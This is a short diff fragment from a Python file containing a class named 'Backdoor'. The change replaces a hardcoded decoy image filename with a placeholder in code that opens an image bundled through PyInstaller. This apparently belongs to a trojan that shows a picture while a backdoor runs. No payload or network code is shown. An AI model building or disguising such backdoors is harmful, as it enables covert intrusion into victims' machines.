@@ -99,7 +99,7 @@ class Backdoor:
         sys.exit()
 
 
-filename = "ditf.jpg"
+filename = "<filename>"
 temp_folder = sys._MEIPASS + "/"
 file = temp_folder + filename
 img = Image.open(file)
